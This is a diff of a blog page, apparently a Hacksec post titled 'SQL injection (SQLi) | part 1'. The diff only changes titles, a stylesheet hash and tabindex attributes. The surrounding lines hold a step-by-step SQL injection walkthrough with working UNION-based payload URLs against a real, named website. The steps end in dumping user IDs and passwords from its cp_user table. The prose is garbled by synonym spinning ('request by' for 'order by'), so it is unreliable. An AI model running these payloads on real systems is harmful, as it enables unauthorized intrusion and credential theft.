@@ -4,19 +4,19 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
-  <title>SQL injection (SQLi) - Hacksec</title>
+  <title>SQL injection (SQLi) | part 1 - Hacksec</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="yandex-verification" content="e598ba3f5d83f9cd" />
   <link rel="icon" href="https://blog.hacksec.infavicon.png">
 
   
   
-  <link rel="stylesheet" href="/css/style.min.716f2dd87366be75c50babe0495f6f831c4925ca6f6a0c66c83ac32c4a258f16.css">
+  <link rel="stylesheet" href="/css/style.min.58ab05db0962441a608730392bd8bbf94bcdbad06af3b3e704d59819a713d42a.css">
   
 
   
     <meta name="description" content="SQL Injection assaults (or SQLi) adjust SQL inquiries, infusing malignant code by utilizing weaknesses."/>
-    <meta property="og:title" content="SQL injection (SQLi)"/>
+    <meta property="og:title" content="SQL injection (SQLi) | part 1"/>
     <meta property="og:type" content="website"/>
     <meta property="og:url" content="https://blog.hacksec.in/posts/sqli/"/>
     <meta property="og:image" content="https://blog.hacksec.in/images/sqli/banner.png"/>
@@ -56,7 +56,7 @@
   <div class="blog">
     
     <div class="intro">
-      <h1>SQL injection (SQLi)<span class="dot">.</span></h1>
+      <h1>SQL injection (SQLi) | part 1<span class="dot">.</span></h1>
       
       <img src="/images/sqli/banner.png" alt="SQL injection (SQLi)"/>
       
@@ -158,7 +158,7 @@
 <h4 id="stage-2-checking-the-vulnerability">Stage 2: Checking the Vulnerability:</h4>
 <p>Presently we should take a look at the weakness of sites. To look at the fault, add the single statements(') toward the finish of the URL and hit enter. (No space between the number and single statements)</p>
 <p>Example:-</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=1&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=1&#39;
 </code></pre></div><p><img src="https://i.postimg.cc/7hNkF34G/1-step.png" alt="enter image description here"></p>
 <p>Suppose the page stays on the same page or shows that page not found or shows some different website pages. Then, at that point, it isn&rsquo;t defenseless.</p>
 <p>If it is showing any mistakes which are identified with SQL query, then it is powerless.</p>
@@ -167,7 +167,7 @@
 <p>For that, supplant the single statements(') with &ldquo;request by a&rdquo; statement. (leave one space among numbers and request by n explanation)</p>
 <p>Change from 1,2,3,4, 5,6,… n. Until you get the blunder like &ldquo;obscure columns. &quot;
 Example:</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=1 order by 1  
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=1 order by 1  
 http://www.pha.org.pk/sro_list.php?catid=1 order by 2  
 http://www.pha.org.pk/sro_list.php?catid=1 order by 3  
 http://www.pha.org.pk/sro_list.php?catid=1 order by 4
@@ -175,7 +175,7 @@ http://www.pha.org.pk/sro_list.php?catid=1 order by 4
 <p>change the number until you get the mistake as &ldquo;obscure segment.&rdquo;</p>
 <p>Assuming you get the blunder while attempting the &ldquo;x&quot;th number, no of the segments is &ldquo;x-1&rdquo;.</p>
 <p>Ex.</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=1 order by 1--(no error)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=1 order by 1--(no error)
 
 http://www.pha.org.pk/sro_list.php?catid=1 order by 2--(no error)
 
@@ -193,7 +193,7 @@ http://www.pha.org.pk/sro_list.php?catid=1 order by 6--(error)
 <p>Utilizing &ldquo;association select columns_sequence&rdquo; we can track down the weak piece of the table. Supplant the &ldquo;request by n&rdquo; with this assertion. Furthermore, change the id worth to negative(i mean id=-2, must change, but in some sites might work without evolving).</p>
 <p>Supplant the columns_sequence with the no from 1 to x-1(number of sections) isolated with commas(,).</p>
 <p>on the off chance that the quantity of segments is 5 ,the query is as follow:-</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,3,4,5--+---
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,3,4,5--+---
 </code></pre></div><p>It will show a few numbers in the page(it should be not exactly &lsquo;x&rsquo; esteem, I mean not exactly or equl to number of sections).</p>
 <p><img src="https://i.postimg.cc/6qxZjX66/step-4.png" alt="enter image description here"></p>
 <p>Presently select 1 number.
@@ -201,7 +201,7 @@ It showing 3,4. How about we take Number 3.</p>
 <h4 id="stage-5-finding-the-table-name">Stage 5: Finding the Table Name</h4>
 <p>Presently we need to track down the table name of the information base. Supplant the 3 with “group_concat(table_name) and add the “from information_schema.tables where table_schema=database()”</p>
 <p>Ex.</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(table_name,0x3c6c693e),4,5 from information_schema.tables where table_schema=database()--+-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(table_name,0x3c6c693e),4,5 from information_schema.tables where table_schema=database()--+-
 </code></pre></div><p>0x3c6c693e this one use to list</p>
 <p><img src="https://i.postimg.cc/tTQ7yNK2/step-5.png" alt="enter image description here"></p>
 <p>Now select the “cp_user ” table.</p>
@@ -214,7 +214,7 @@ It showing 3,4. How about we take Number 3.</p>
 <p>select sql-&gt;Mysql-&gt;MysqlChar()</p>
 <p>Reorder the code toward the finish of the url rather than the &ldquo;mysqlchar&rdquo;</p>
 <p>Ex.</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(column_name,0x3c6c693e),4,5 from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)--+-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"> http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(column_name,0x3c6c693e),4,5 from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)--+-
 </code></pre></div><p><img src="https://i.postimg.cc/43tN8hYt/step-6.png" alt="### (img 6)"></p>
 <p>Presently it will show the rundown of sections.</p>
 <p>like -</p>
@@ -225,12 +225,12 @@ It showing 3,4. How about we take Number 3.</p>
 <li>u_type</li>
 <li>is_active ..</li>
 </ul>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Presently supplant the supplant group_concat(column_name) with group_concat(columnname,0x3c6c693e,another column name).
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Presently supplant the supplant group_concat(column_name) with group_concat(columnname,0x3c6c693e,another column name).
 </code></pre></div><p>Column name ought to be supplanted from the recorded segment name.</p>
 <p>Another column name ought to be supplanted from the recorded segment name.</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Presently supplant the &#34; from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)&#34; with the &#34;from table_name&#34;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Presently supplant the &#34; from information_schema.columns where table_name=CHAR(99, 112, 95, 117, 115, 101, 114)&#34; with the &#34;from table_name&#34;
 </code></pre></div><p>Ex:</p>
-<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(u_id,0x3c6c693e,u_pass),4,5 from cp_user--+-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://www.pha.org.pk/sro_list.php?catid=-1 +UNION+ALL+SELECT+1,2,group_concat(u_id,0x3c6c693e,u_pass),4,5 from cp_user--+-
 </code></pre></div><p><img src="https://i.postimg.cc/9f1NHLwj/7.png" alt="enter image description here"></p>
 <p>At some point, it will show the section isn&rsquo;t found.
 Then, at that point, attempt another section names
